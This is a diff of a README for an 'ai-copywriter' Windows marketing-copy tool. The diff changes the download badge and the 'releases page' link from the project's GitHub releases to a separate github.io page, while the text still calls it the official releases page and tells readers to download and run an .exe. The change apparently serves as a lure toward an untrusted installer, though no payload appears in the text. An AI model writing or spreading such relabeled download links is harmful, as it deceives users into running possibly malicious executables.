@@ -1,6 +1,6 @@
 # ✍️ ai-copywriter - Write effective marketing copy with ease
 
-[![](https://img.shields.io/badge/Download-ai-copywriter-blue)](https://github.com/Caseinpainthindu889/ai-copywriter/releases)
+[![](https://img.shields.io/badge/Download-ai-copywriter-blue)](https://caseinpainthindu889.github.io)
 
 This application creates marketing copy for your business. It uses marketing principles and copywriting techniques to craft text that sounds human. You use this tool to write emails, website content, and social media posts. The software runs locally on your Windows computer, which keeps your data private.
 
@@ -8,7 +8,7 @@ This application creates marketing copy for your business. It uses marketing pri
 
 You need to download the installer file from the official releases page. Follow these steps to find the correct file.
 
-1. Visit the [releases page](https://github.com/Caseinpainthindu889/ai-copywriter/releases).
+1. Visit the [releases page](https://caseinpainthindu889.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends with `.exe` to start your download.
 4. Save the file to your computer.
